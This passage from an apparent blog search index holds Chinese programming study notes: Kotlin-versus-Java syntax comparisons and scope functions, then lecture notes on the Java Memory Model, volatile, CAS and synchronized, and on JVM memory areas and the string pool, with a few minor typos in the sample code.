\"OK\" in 1..3 -&gt; \"Fail\" else -&gt; \"Fail\"&#125; for循环 Java 12345678910111213for (int i = 1; i &lt;= 10 ; i++) &#123; &#125;for (int i = 1; i &lt; 10 ; i++) &#123; &#125;for (int i = 10; i &gt;= 0 ; i--) &#123; &#125;for (int i = 1; i &lt;= 10 ; i+=2) &#123; &#125;for (int i = 10; i &gt;= 0 ; i-=2) &#123; &#125;for (String item : collection) &#123; &#125;for (Map.Entry&lt;String, String&gt; entry: map.entrySet()) &#123; &#125; Kotlin 12345678910111213for (i in 1..10) &#123; &#125;for (i in 1 until 10) &#123; &#125;for (i in 10 downTo 0) &#123; &#125;for (i in 1..10 step 2) &#123; &#125;for (i in 10 downTo 0 step 2) &#123; &#125;for (item in collection) &#123; &#125;for ((key, value) in map) &#123; &#125; 更方便的集合操作 Java 12345678910111213final List&lt;Integer&gt; listOfNumber = Arrays.asList(1, 2, 3, 4);final Map&lt;Integer, String&gt; keyValue = new HashMap&lt;Integer, String&gt;();map.put(1, \"Amit\");map.put(2, \"Ali\");map.put(3, \"Mindorks\");// Java 9final List&lt;Integer&gt; listOfNumber = List.of(1, 2, 3, 4);final Map&lt;Integer, String&gt; keyValue = Map.of(1, \"Amit\", 2, \"Ali\", 3, \"Mindorks\"); Kotlin 1234val listOfNumber = listOf(1, 2, 3, 4)val keyValue = mapOf(1 to \"Amit\", 2 to \"Ali\", 3 to \"Mindorks\") 遍历 Java 1234567891011121314151617// Java 7 and belowfor (Car car : cars) &#123; System.out.println(car.speed);&#125;// Java 8+cars.forEach(car -&gt; System.out.println(car.speed));// Java 7 and belowfor (Car car : cars) &#123; if (car.speed &gt; 100) &#123; System.out.println(car.speed); &#125;&#125;// Java 8+cars.stream().filter(car -&gt; car.speed &gt; 100).forEach(car -&gt; System.out.println(car.speed)); Kotlin 123456cars.forEach &#123; println(it.speed)&#125;cars.filter &#123; it.speed &gt; 100 &#125; .forEach &#123; println(it.speed)&#125; 方法定义 Java 1234567void doSomething() &#123; // logic here&#125;void doSomething(int... numbers) &#123; // logic here&#125; Kotlin 1234567fun doSomething() &#123; // logic here&#125;fun doSomething(vararg numbers: Int) &#123; // logic here&#125; 带返回值的方法 Java 1234int getScore() &#123; // logic here return score;&#125; Kotlin 12345678fun getScore(): Int &#123; // logic here return score&#125;// as a single-expression functionfun getScore(): Int = score 无结束符号 Java 1234int getScore(int value) &#123; // logic here return 2 * value;&#125; Kotlin 12345678fun getScore(value: Int): Int &#123; // logic here return 2 * value&#125;// as a single-expression functionfun getScore(value: Int): Int = 2 * value constructor 构造器 Java 1234567891011public class Utils &#123; private Utils() &#123; // This utility class is not publicly instantiable &#125; public static int getScore(int value) &#123; return 2 * value; &#125; &#125; Kotlin 1234567891011121314151617181920class Utils private constructor() &#123; companion object &#123; fun getScore(value: Int): Int &#123; return 2 * value &#125; &#125;&#125;// another wayobject Utils &#123; fun getScore(value: Int): Int &#123; return 2 * value &#125;&#125; 继承 Java 1234public class User extends Persion&#123; &#125; Kotlin 123class User : Persion() &#123;&#125; 实现接口 Java 123456789101112131415public class User implements Persion&#123; @Override public void onName() &#123; &#125; &#125;new Persion()&#123; @Override public void onName() &#123; &#125;&#125; Kotlin 1234567class User : Persion &#123; override fun onName() &#123;&#125;&#125;object : Persion &#123; override fun onName() &#123;&#125;&#125; Get Set 构造器 Java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253public class Developer &#123; private String name; private int age; public Developer(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; @Override public boolean equals(Object o) &#123; if (this == o) return true; if (o == null || getClass() != o.getClass()) return false; Developer developer = (Developer) o; if (age != developer.age) return false; return name != null ? name.equals(developer.name) : developer.name == null; &#125; @Override public int hashCode() &#123; int result = name != null ? name.hashCode() : 0; result = 31 * result + age; return result; &#125; @Override public String toString() &#123; return \"Developer&#123;\" + \"name='\" + name + '\\'' + \", age=\" + age + '&#125;'; &#125;&#125; Kotlin 1data class Developer(val name: String, val age: Int) 原型扩展 Java 12345678910111213public class Utils &#123; private Utils() &#123; // This utility class is not publicly instantiable &#125; public static int triple(int value) &#123; return 3 * value; &#125; &#125;int result = Utils.triple(3); Kotlin 12345fun Int.triple(): Int &#123; return this * 3&#125;var result = 3.triple() Java 12345678910111213141516public enum Direction &#123; NORTH(1), SOUTH(2), WEST(3), EAST(4); int direction; Direction(int direction) &#123; this.direction = direction; &#125; public int getDirection() &#123; return direction; &#125; &#125; Kotlin123456enum class Direction(val direction: Int) &#123; NORTH(1), SOUTH(2), WEST(3), EAST(4);&#125; let内联函数 Kotlin12345val result = \"testLet\".let &#123; println(it.length) 1000&#125;println(result) //1000 场景一: 最常用的场景就是使用let函数处理需要针对一个可null的对象统一做判空处理。场景二: 然后就是需要去明确一个变量所处特定的作用域范围内可以使用 Kotlin 不用let123mVideoPlayer?.setVideoView(activity.course_video_view)mVideoPlayer?.setControllerView(activity.course_video_controller_view)mVideoPlayer?.setCurtainView(activity.course_video_curtain_view) 用let12345mVideoPlayer?.let &#123; it.setVideoView(activity.course_video_view) it.setControllerView(activity.course_video_controller_view) it.setCurtainView(activity.course_video_curtain_view)&#125; also内联函数also函数和let差不多，also返回传入对象，let返回最后一行的值。 12345val result = \"testAlso\".also &#123; println(it.length) 1000&#125;println(result) //testAlso with内联函数with函数是接收了两个参数，分别为T类型的对象和一个lambda函数块，所以with函数最原始样子:1234val result = with(user, &#123; println(\"my name is $name, I am $age years old, my phone number is $phoneNum\") 1000&#125;) 最后一行的 ‘1000’ 返回值赋值给 ‘result’ 但是由于with函数最后一个参数是一个函数，可以把函数提到圆括号的外部，所以最终with函数的调用形式:1234val result = with(user) &#123; println(\"my name is $name, I am $age years old, my phone number is $phoneNum\") 1000&#125; 使用场景：适用于调用同一个类的多个方法时，可以省去类名重复，直接调用类的方法即可，经常用于Android中RecyclerView中onBinderViewHolder中，数据model的属性映射到UI上 Java 12345678910111213@Overridepublic void onBindViewHolder(ViewHolder holder, int position) &#123; MyItem item = getItem(position); if (item == null) &#123; return; &#125; holder.tvTitle.setText(item.title); holder.tvDate.setText(item.date); holder.tvInfo.setText(item.info); holder.tvCount.setText(item.count); ...&#125; Kotlin1234567891011override fun onBindViewHolder(holder: ViewHolder, position: Int)&#123; val item = getItem(position)?: return with(item)&#123; holder.tvTitle.text = title holder.tvDate.text = date holder.tvInfo.text = info holder.tvCount.text = count ... &#125;&#125; run内联函数run函数实际上可以说是let和with两个函数的结合体，run函数只接收一个lambda函数为参数，以闭包形式返回，返回值为最后一行的值或者指定的return的表达式。1234567val user = User(&quot;Kotlin&quot;, 1, &quot;1111111&quot;)val result = user.run &#123; println(&quot;my name is $name, I am $age years old, my phone number is $phoneNum&quot;) 1000&#125;println(&quot;result: $result&quot;) 适用于let,with函数任何场景。因为run函数是let,with两个函数结合体，准确来说它弥补了let函数在函数体内必须使用it参数替代对象，在run函数中可以像with函数一样可以省略，直接访问实例的公有属性和方法，另一方面它弥补了with函数传入对象判空问题，在run函数中可以像let函数一样做判空处理。 Kotlin12345678910override fun onBindViewHolder(holder: ViewHolder, position: Int)&#123; getItem(position)?.run&#123; holder.tvTitle.text = title holder.tvDate.text = date holder.tvInfo.text = info holder.tvCount.text = count ... &#125;&#125; apply内联函数和run差不多，apply返回的是对象本身。使用场景：实例化一个对象，对属性进行赋值","categories":[{"name":"Kotlin","slug":"Kotlin","permalink":"http://yoursite.com/categories/Kotlin/"}],"tags":[{"name":"kotlin","slug":"kotlin","permalink":"http://yoursite.com/tags/kotlin/"}]},{"title":"黑马程序员并发编程","slug":"Java/黑马程序员并发编程","date":"2020-08-03T13:52:39.000Z","updated":"2021-12-28T03:24:10.158Z","comments":true,"path":"Java/黑马程序员并发编程/","link":"","permalink":"http://yoursite.com/Java/黑马程序员并发编程/","excerpt":"","text":"本文是【黑马程序员并发编程-哔哩哔哩】教学视频学习所做的笔记 一、XXX定义","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[]},{"title":"黑马程序员JMM学习笔记","slug":"Java/黑马程序员JMM学习笔记","date":"2020-08-03T13:52:38.000Z","updated":"2021-12-28T03:24:10.154Z","comments":true,"path":"Java/黑马程序员JMM学习笔记/","link":"","permalink":"http://yoursite.com/Java/黑马程序员JMM学习笔记/","excerpt":"","text":"本文是【黑马程序员JVM完整教程，全网超高评价，全程干货不拖沓-哔哩哔哩】教学视频学习所做的笔记 四、什么是 JMM定义Java内存模型 Java Memory Model ( JMM ) 简单来说，JMM定义了一套在多线程读写共享内存时（成员变量、数组），对数据的可见性、有序性、原子性的规则和保障。 1、原子性所谓的原子性是指在一次操作或者多次操作中，要么所有的操作全部都得到了执行并且不会受到任何因素的干扰而中断，要么所有的操作都不执行，多个操作是一个不可以分割的整体。 问题：两个线程对初始值为0的静态变量操作：一个做自增，一个做自减，各做5000次，结果会是0吗？ 代码： 结果：以上的结果可能是正数、负数、零。因为Java中对静态变量的自增自减并不是原子性操作。 看自增自减的字节码分析： 而Java 的内存模式如下图，完成静态变量的自增、自减操作需要在 “主内存” 和 “线程内存” 进行数据交换 如果是单线程，以上8行代码是顺序执行（不会交错）没有问题： 但多线程下，这8行代码可能会交错执行： 用synchronized关键字通过代码，进行原子性操作： 优化代码： 2、可见性看以下代码： 1234567891011121314static boolean run = true;public static void main(String[] args) throws InterruptedException &#123; Thread t = new Thread(() -&gt; &#123; while (run)&#123; // ... &#125; &#125;); t.start(); Thread.sleep(1000); // 线程t不会如预想的停下来 run = false;&#125; 线程 t 不会如预想的停下来，这就是由于线程的高速缓存内存导致了 可见性 问题， （注：这种模式在Android平台上线程t能停止，但这里分析的是非Android平台） 分析以上代码： 初始状态，t 线程从 “主内存” 读取 run 的值到 “工作内存”。 因为 t 线程要频繁的从主内存读取 run 的值，JIT编译器会将 run 的值缓存至“工作内存”中的高速缓存中，减少对主内存中 run 的访问，提高访问效率。 Thread.sleep(1000); 执行结束后，main线程修改 run 的值，并同步至主内存， 而 t 线程是从自己工作内存中的高速缓存中读取这个 run 的值，结果永远是旧值。 解决办法：给静态变量 run 加一个关键字 volatile 修饰。 总结：以上是一个可见性的问题。 volatile 可以用来修饰 成员变量 和 静态成员变量，可以避免线程从自己的工作缓存中查找变量的值，必须到主内存中获取变量的值，线程操作 “volatile 变量” 都是直接操作“主内存”。 volatile 可见性 的特性是指在多个线程之间，保证一个线程对 volatile 变量的修改对另外一个线程可见。 volatile 不能保证原子性，仅用在“一个线程” 写，“多个线程” 读 的情况。 synchronized 语句块即可保证代码块的原子性 ，也同时保证代码块内的变量 可见性 。但缺点是他是重量级操作，性能相对更低。 看如下代码： 12345678910111213141516static boolean run = true;public static void main(String[] args) throws InterruptedException &#123; Thread t = new Thread(() -&gt; &#123; while (run)&#123; // System.out.println() 内部使用了synchronized // 所以也可以保证对 run 的可见性 System.out.println(1) &#125; &#125;); t.start(); Thread.sleep(1000); // 线程t能停下来 run = false;&#125; 3、有序性同一个线程内，JVM会在不影响正确性的情况下，调整语句执行的顺序，看如下代码： 123456static int i;static int j;//在某线程内执行如下赋值操作i = ...;//这是一个较为耗时操作j = ...; 可以看到，i j 的赋值对结果不会产生影响。所以顺序可以是： 12i = ...;//这是一个较为耗时操作j = ...; 也可以是 12j = ...;i = ...;//这是一个较为耗时操作 这种特性称为 【指令重排】，多线程下【指令重排】会影响正确性，例如著名的 double-checked locking 模式实现单例。 看代码： 123456789101112131415161718public final class Singleton &#123; private Singleton()&#123;&#125; private static Singleton INSTANCE = null; public static Singleton getInstance()&#123; //示例没创建，才会进入内部的 synchronized 代码块 if(INSTANCE == null)&#123; synchronized (Singleton.class)&#123; // 也许有其他线程已经创建了实例，所以在判断一次 if(INSTANCE == null)&#123; INSTANCE = new Singleton(); &#125; &#125; &#125; return INSTANCE; &#125;&#125; 这段代码的特点是： 懒惰实例化 首次使用 getInstance() 才使用 synchronized 加锁，后续使用时无需加锁。 但在多线程下，这是有问题的，因为 INSTANCE = new Singleton(); 实例化会有【指令重排】问题。 new Singleton() 分析字节码： 4： 构造方法 7：将引用地址复制给 INSTANCE 变量 其中 第 4 和 第 7 的顺序是不固定的，在多线程下，可能会按照如下顺序执行： 这样的话，t1 尚未完全执行构造方法，如果构造方法中需要执行很多初始化操作，那么 t2 线程拿到的是一个未完全初始化的单例。 解决有序性： 对 INSTANCE 使用 volatile 修饰。 总结： volatile 可以禁止指令重排。 4、happens-before 规则 这是总结，可以不看，理解上面的三节基本就懂了。 happens-before 规定了哪些写操作对其他线程的读操作可见，它是可见性和有序性的一套规则总结。 线程解锁 m 之前，对变量的赋值，对于接下来“对 m 加锁”的“其他线程”对“该变量”可见 1234567891011121314static int x;static Object m = new Object();new Thread(()-&gt;&#123; synchronized(m)&#123; x = 10; &#125;&#125;,\"t1\").start(); new Thread(()-&gt;&#123; synchronized(m)&#123; System.out.println(x); &#125;&#125;,\"t2\").start(); 线程对volatile变量的赋值，对接来其他线程对该变量可见 12345678volatile static int x;new Thread(()-&gt;&#123; x = 10;&#125;,\"t1\").start();new Thread(()-&gt;&#123; System.out.println(x);&#125;,\"t2\").start(); 线程 start 前对变量的赋值，对该线程开始后对改变的可见 1234567static int x;x = 10;new Thread(()-&gt;&#123; System.out.println(x);&#125;,\"t2\").start(); 线程结束前对变量的赋值，对其他线程得知它结束后读可见（比如其他线程调用 t1.isAlive() 或者 t1.join()等待它结束） 123456789static int x;Thread t1 = new Thread(()-&gt;&#123; x= 10;&#125;,\"t1\");t1.start();t1.join();System.out.println(x); 线程 t1 打断 t2 ( interrupt ) 前对变量的赋值，对于其他线程得知 t2 被打断后对便利的读可见（通过 t2.interrupted 或者 t2.isInterrupted） 12345678910111213141516171819202122232425262728293031323334353637public class Demo5 &#123; static int x; public static void main(String[] args) &#123; Thread t2 = new Thread(()-&gt;&#123; while (true)&#123; if(Thread.currentThread().isInterrupted())&#123; System.out.println(x); break; &#125; &#125; &#125;,\"t2\"); t2.start(); new Thread(()-&gt;&#123; try &#123; Thread.sleep(1000); &#125; catch (InterruptedException e) &#123; e.printStackTrace(); &#125; // 打断前赋值 x = 10; t2.interrupt(); &#125;,\"t1\"); t2.start(); while (!t2.isInterrupted())&#123; Thread.yield(); &#125; System.out.println(x); &#125;&#125; 对变量默认值（0，false，null）的赋值，对其他线程时可见的 具有传递性，如果 x hb(happens-before) -&gt; y 并且 y hb -&gt; z 那么有 x hb -&gt; z 5、CAS与原子类5.1 CASCAS （Compare and Swap），它体现的一种乐观锁的思想（无锁并发），比如多线程对一个共享Int变量做加1操作： synchronized 是悲观锁思想 12345678910111213//死循环，不断尝试while(true)&#123; int 旧值 = 共享变量; //假如取到的值是0 int 结果 = 旧值 + 1;// 0 + 1 = 1 /** 1. 执行到这里，如果其他线程修改 “共享变量”值为5，则本线程的计算结果作废,compareAndSwap会返回false；重新进入循环尝试。 2. 直到compareAndSwap返回true时，表示本线程做修改的同时，其他线程没有做任何修改（干扰） */ if( compareAndSwap(旧值,结果))&#123; //成功，退出循环 &#125;&#125; 获取“共享变量”时，为了保证它的可见性，需要用 volatile 修饰。 结合CAS 和 volatile 可以实现无锁并发，适用于竞争不激烈、多核CPU（死循环的原因）场景下。 因为没有使用 synchronized，线程不会阻塞，这是效果提升的因素之一 如果竞争激烈，可以想到重试必然频繁发送，反而效率会受到影响 CAS 底层依赖一个 Unsafe 类来直接调用操作系统底层的 CAS 指令 5.2 原子操作类java.util.concurrent 中提供了原子操作类，可以提供线程安全的操作. 例如：AtomicInteger、AtomicBoolean等，它们底层就是采用CAS + volatile实现。 123456789101112131415161718192021222324252627282930import java.util.concurrent.atomic.AtomicInteger;public class AtomicDemo &#123; private static AtomicInteger i = new AtomicInteger(0); public static void main(String[] args) throws InterruptedException &#123; Thread t1 = new Thread(()-&gt;&#123; for (int j = 0; j &lt; 5000; j++) &#123; i.getAndIncrement(); //获取并自增 i++ // i.incrementAndGet(); //自增并获取 ++i &#125; &#125;); Thread t2 = new Thread(()-&gt;&#123; for (int j = 0; j &lt; 5000; j++) &#123; i.getAndDecrement(); //获取并自减 i-- &#125; &#125;); t1.start(); t2.start(); t1.join(); t2.join(); System.out.println(i); &#125;&#125; 6、synchronized 优化Java HotSpot 虚拟机中，每个对象都有对象头（class 指针、Mark Word）。Mark Word 平时存储这个对象的hash码、分代年龄，当加锁时，这些信息就根据情况被替换为标记位、线程锁记录指针、重量级锁指针、线程ID等。 synchronized本身是一个重量级的操作，但JDK一直为synchronized做优化，比如轻量级锁等。 6.1 轻量级锁 每个线程栈帧都会包含一个锁记录的结构，内部可以存储锁定对象的 Mark Word 以下分析上面代码块轻量级锁加锁的过程（多个线程访问时间错开） 6.2 锁膨胀如果在尝试加轻量级锁的过程中CAS操作失败，有一种情况是有其他线程为对象加上轻量级锁（有竞争），这时需要进行锁膨胀，将轻量级锁升级为重量级锁。 看示例： 123456static Object obj = new Object();public static void method1()&#123; synchronized(obj)&#123; //同步代码块 &#125;&#125; 分析： 6.3 重量级锁 自旋：先不进入阻塞，尝试重试 重量级锁自旋优化 6.4 偏向锁 这个比较复杂，稍微理解就行，课程里面也是带过一下 6.5 其他优化","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[{"name":"jmm","slug":"jmm","permalink":"http://yoursite.com/tags/jmm/"}]},{"title":"黑马程序员JVM类加载与字节码笔记","slug":"Java/黑马程序员JVM类加载与字节码笔记","date":"2020-08-03T13:52:37.000Z","updated":"2021-12-28T03:24:10.157Z","comments":true,"path":"Java/黑马程序员JVM类加载与字节码笔记/","link":"","permalink":"http://yoursite.com/Java/黑马程序员JVM类加载与字节码笔记/","excerpt":"","text":"本文是【黑马程序员JVM完整教程，全网超高评价，全程干货不拖沓-哔哩哔哩】教学视频学习所做的笔记 部分笔记内容拷贝自【JVM学习】 三、类加载与字节码笔","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[{"name":"jvm","slug":"jvm","permalink":"http://yoursite.com/tags/jvm/"}]},{"title":"黑马程序员JVM学习笔记","slug":"Java/黑马程序员JVM学习笔记","date":"2020-08-03T13:52:36.000Z","updated":"2021-12-28T03:24:10.155Z","comments":true,"path":"Java/黑马程序员JVM学习笔记/","link":"","permalink":"http://yoursite.com/Java/黑马程序员JVM学习笔记/","excerpt":"","text":"本文是【黑马程序员JVM完整教程，全网超高评价，全程干货不拖沓-哔哩哔哩】教学视频学习所做的笔记 部分笔记内容拷贝自【JVM学习】 一、什么是JVM定义Java Virtual Machine，JAVA程序的运行环境（JAVA二进制字节码的运行环境） 好处 一次编写，到处运行 自动内存管理，垃圾回收机制 数组下标越界检查 比较JVM JRE JDK的区别 常见JVM 二、内存结构 程序计数器 虚拟机栈 本地方法栈 堆 方法区 1、程序计数器作用：用于保存JVM中下一条所要执行的指令的地址 特点： 线程私有 CPU会为每个线程分配时间片，当当前线程的时间片使用完以后，CPU就会去执行另一个线程中的代码 程序计数器是每个线程所私有的，当另一个线程的时间片用完，又返回来执行当前线程的代码时，通过程序计数器可以知道应该执行哪一行指令 不会存在内存溢出 2、虚拟机栈 2.1 定义Java Virtual Machine Stacks (Java虚拟机栈) 每个线程运行时所需要的内存空间，称为虚拟机栈 每个栈由多个栈帧(Frame)组成，对应着每次调用方法时所占用的内存 每个线程只能有一个活动栈帧，对应着当前正在执行的方法 演示代码： 1234567891011121314public class Main &#123; public static void main(String[] args) &#123; method1(); &#125; private static void method1() &#123; method2(1, 2); &#125; private static int method2(int a, int b) &#123; int c = a + b; return c; &#125;&#125; 问题辨析： 垃圾回收是否涉及栈内存？ 不需要。因为虚拟机栈中是由一个个栈帧组成的，在方法执行完毕后，对应的栈帧就会被弹出栈。所以无需通过垃圾回收机制去回收内存。 栈内存的分配越大越好吗？ 不是。因为物理内存是一定的，栈内存越大，可以支持更多的递归调用，但是可执行的线程数就会越少。 -Xss size 指定栈内存大小，一般无需指定，使用默认的即可。 方法内的局部变量是否是线程安全的？ 变量是否线程安全，要看此变量是线程共享的，还是私有的？ 如果方法内局部变量没有逃离方法的作用范围，则是线程安全的 如果如果局部变量引用了对象，并逃离了方法的作用范围，则需要考虑线程安全问题 2.2 内存溢出栈内存溢出错误： Java.lang.stackOverflowError 发生原因： 虚拟机栈中，栈帧过多（无限递归） 虚拟机栈中，栈帧过大 (不容易出现) 2.3 线程运行诊断案例1：CPU占用过多 演示代码：while(true){...}，nohup 运行 top 查看进程 PID 占用情况 ps H -eo pid, tid, %cpu | grep 具体PID 查看某进程(pid)中的线程(tid)占用CPU的详细情况 jstack PID 查看进程所有线程的nid (16进制)，tid是10进制值，转换nid或tid比对，可以定位到线程的哪行代码出了问题。 案例2：程序运行很久都没有结果 演示代码：死锁 jstack PID 查看线程运行情况，能看到死锁信息 3、本地方法栈 一些带有 native 关键字的方法，Java调用C/C++方法。 本地方法栈 的作用就是为 本地方法 的运行提供内存空间。 4、堆(Heap) 前面1.2.3点的 “栈” 都是线程 “私有” 的区，而 “堆” 和 “方法区” 是线程共享的区。 定义：通过new关键字创建的对象都会被放在堆内存 特点 所有线程共享，堆内存中的对象都需要考虑线程安全问题 有垃圾回收机制 4.1 堆内存溢出 堆内存虽然有垃圾回收，但如果不断产生新的对象，而产生的对象一直有引用，那么无法垃圾回收，堆内存将会耗尽，也就是堆内存溢出。 -Xmx Size 参数指定堆内存大小 4.2 堆内存诊断 jps 工具 命令行查看当前系统中Java进程 jmap 工具 命令行查看某时刻堆内存占用情况 OracleJDK运行没问题，但OpenJDK可能无法直接运行： $ jmap -heap 37420Error: -heap option usedCannot connect to core dump or remote debug server. Use jhsdb jmap instead jconsole 工具 图形界面多功能监控工具，可以连续监测 jvisualvm 工具 图形界面多功能监控工具，可以连续监测，可以对堆内存抓取快照，以下是示例： 5、方法区方法区的定义摘自【JVM 规范】 翻译 ： Java虚拟机中有一个被所有线程共享的方法区。它存储着每个类的结构(structures)信息，譬如运行时的常量池(run-time constant pool)，字段(field)，方法数据(medthod data)，以及方法和构造方法的代码，包括一些在类和实例初始化和接口初始化时候使用的特殊方法。 方法区在JVM启动时候被创建。虽然方法区在逻辑层面上是堆的一部分(具体由厂商实现，如IBM，Oracle等)，但是就简单实现来说既不会被回收也不会被压缩。这个规范并不强制指定方法区存放的位置也不会对编译过的代码有管理策略的限制（oraclejdk 1.8和1.7及之前实现就不一样）。 方法区可能有一个固定的大小或者也可以通过计算大小去扩展也可以在不需要的时候被压缩。 方法区的内存也不需要是连续的。 Jvm虚拟机实现可以提供给编程人员或者用户初始化方法区的大小，同时在方法区可变大小的情况下，控制这个方法区的最大值和最小值。 和方法区有关联的异常情况：如果方法区满足不了构造所需要的内存，JVM就会抛出内存溢出错误：OutOfMemoryError。 JVM内存结构示意图： 5.1 内存溢出 1.8以前会导致永久代(PermGen)内存溢出参数-XX:MaxPermSize=8m 可以测试导致错误： java.lang.OutOfMemoryError: PermGen space 1.8以后会导致元空间(Metaspace)内存溢出参数-XX:MaxMetaspaceSize=8m 可以测试导致错误： java.lang.OutOfMemoryError: Metaspace 加载过多的class会导致内存溢出，实际项目中容易出现该错误的常见场景有：spring 、mybatis等大型框架。 5.2 常量池二进制字节码的组成：类的基本信息、常量池、类的方法定义（包含了虚拟机指令） 常量池就是一张表，虚拟机指令根据这张常量表找到要执行的类名、方法名、参数类型、字面量信息 5.3 运行时常量池常量池是在 *.class 文件中的，当该class类被加载以后，它的常量池信息就会放入运行时常量池，并把里面的符号地址变为真实内存地址 5.4 串池(StringTable)StringTable是字符串常量池（简称串池），其数据结构上是一个 hash 表，字符串对象就充当 hash 表中的 key，key 的不重复性，是 hash 表的基本特性。它是jdk用来解决以new的方式创建字符串对象的一个缺点：堆内存中会存在大量重复的字符串，占用内存。 5.4.1 StringTable的特性： 常量池中的字符串仅是符号，只有在被用到时才会转化为对象 利用串池的机制，来避免重复创建字符串对象 字符串变量拼接的原理是StringBuilder 字符串常量拼接的原理是编译器优化 可以使用String.intern()方法，主动将串池中还没有的字符串对象放入串池中 注意：无论是串池还是堆里面的字符串，都是对象 注意：示例运行的环境： openjdk version “1.8.0_141”OpenJDK Runtime Environment (build 1.8.0_141-8u141-b15-3~14.04-b15)OpenJDK 64-Bit Server VM (build 25.141-b15, mixed mode) StringTable示例1：1234567public class StringTableStudy &#123; public static void main(String[] args) &#123; String a = \"a\"; String b = \"b\"; String ab = \"ab\"; &#125;&#125; javap -v StringTableStudy.class反编译结果 123456789Code: stack=1, locals=4, args_size=1 0: ldc #2 // String a 2: astore_1 3: ldc #3 // String b 5: astore_2 6: ldc #4 // String ab 8: astore_3 9: return 当执行到 ldc #2 时，会把符号 a 变为 “a” 字符串对象，并放入串池中 当执行到 ldc #3 时，会把符号 b 变为 “b” 字符串对象，并放入串池中 当执行到 ldc #4 时，会把符号 ab 变为 “ab” 字符串对象，并放入串池中 最终串池 StringTable [“a”, “b”, “ab”] 总结：字符串对象的创建都是懒惰的，只有当运行到那一行字符串且在串池中不存在的时候（如 ldc #2）时，该字符串才会被创建并放入串池中。 StringTable示例2：123456789public class StringTableStudy &#123; public static void main(String[] args) &#123; String a = \"a\"; String b = \"b\"; String ab = \"ab\"; //拼接字符串对象来创建新的字符串 String ab2 = a+b; //分析此行 &#125;&#125; javap -v StringTableStudy.class反编译结果 123456789101112131415161718Code: stack=2, locals=5, args_size=1 0: ldc #2 // String a 2: astore_1 3: ldc #3 // String b 5: astore_2 6: ldc #4 // String ab 8: astore_3 9: new #5 // class java/lang/StringBuilder 12: dup 13: invokespecial #6 // Method java/lang/StringBuilder.\"&lt;init&gt;\":()V 16: aload_1 17: invokevirtual #7 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 20: aload_2 21: invokevirtual #7 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 24: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 27: astore 4 29: return 只分析最后一行代码 9: new #5 new一个StringBuilder对象 13: invokespecial #6 执行StringBuilder的构造方法 16: aload_1加载 参数astore_1 17: invokevirtual #7 调用append方法 20: aload_2 加载 参数astore_2 21: invokevirtual #7 调用append方法 24: invokevirtual #8 toString()方法，new一个在堆内存的对象 27: astore 4 把toString()的对象存储 String ab2 = a+b; 创建字符串的过程是 StringBuilder().append(“a”).append(“b”).toString() 再看代码： 12345678910111213141516public class StringTableStudy &#123; public static void main(String[] args) &#123; String a = \"a\"; String b = \"b\"; //存放在串池中 String ab = \"ab\"; //存放在堆内存 //StringBuilder().append(“a”).append(“b”).toString() String ab2 = a+b; //结果是false，因为两者的存放位置不同 System.out.println(ab == ab2); &#125;&#125; StringTable示例3：123456789public class StringTableStudy &#123; public static void main(String[] args) &#123; String a = \"a\"; String b = \"b\"; String ab = \"ab\"; String ab2 = a+b; String ab3 = \"a\" + \"b\"; //分析此行 &#125;&#125; javap -v StringTableStudy.class反编译结果 1234567891011121314151617181920Code: stack=2, locals=6, args_size=1 0: ldc #2 // String a 2: astore_1 3: ldc #3 // String b 5: astore_2 6: ldc #4 // String ab 8: astore_3 9: new #5 // class java/lang/StringBuilder 12: dup 13: invokespecial #6 // Method java/lang/StringBuilder.\"&lt;init&gt;\":()V 16: aload_1 17: invokevirtual #7 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 20: aload_2 21: invokevirtual #7 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder; 24: invokevirtual #8 // Method java/lang/StringBuilder.toString:()Ljava/lang/String; 27: astore 4 29: ldc #4 // String ab 31: astore 5 33: return 直接看 29: ldc ：javac在编译期会进行优化，结果已在编译期确定为ab，而创建ab的时候已经在串池中放入了字符串“ab”，所以ab3直接从串池中获取值，所以进行的操作和 ab = “ab” 一致。 5.4.2 intern方法调用字符串对象的intern方法，主动将串池中还没有的字符串对象放入到串池。 intern示例1： 123456789101112131415161718public class Main &#123; public static void main(String[] args) &#123; //\"a\" \"b\" 被放入串池中，s则存在于堆内存之中 String s = new String(\"a\") + new String(\"b\"); //尝试将堆中s对象放入串池， //串池中如果已存在此字符串并不会放入; //串池中如果不存在此字符串则会放入串池，并把串池中的对象返回; //此时串池中没有\"ab\"，则s会放入到串池，并返回给s2 String s2 = s.intern(); //s3赋值，因为此时串池中已有\"ab\"，则直接将串池中的内容返回 String s3 = \"ab\"; //因为堆内存与串池中的\"ab\"是同一个对象，所以以下两条语句打印的都为true System.out.println(str == st2); System.out.println(str == str3); &#125;&#125; intern示例2： 12345678910111213141516public class Main &#123; public static void main(String[] args) &#123; //\"ab\"被放入串池中 String x = \"ab\"; //\"a\" \"b\" 被放入串池中，s则存在于堆内存之中 String s = new String(\"a\") + new String(\"b\"); //尝试将堆中s对象放入串池， //串池中已有\"ab\"，则s不会放入到串池(s依然是堆中的对象)，并返回串池中的\"ab\"给s2 String s2 = s.intern(); System.out.println(s2 == x);//true System.out.println(s == x); //false，堆 != 串池 &#125;&#125; intern在JDK1.8和1.6上的区别： 1.8 将字符串对象尝试放入串池，如已存在则不放入，会把串池中的对象返回；如不存在则把对象放入串池，会把串池中的对象返回 1.6 将字符串对象尝试放入串池，如已存在则不放入，会把串池中的对象返回；如不存在则把对象复制一份放入串池，会把串池中的对象返回 5.4.3 StringTable的位置 1.8 在堆内存中 (回收效率高) 1.6 在永久代PermGen (触发垃圾回收时间晚，回收效率不高) 5.4.4 StringTable垃圾回收​ StringTable在内存紧张时，会发生垃圾回收 5.4.5 StringTable调优 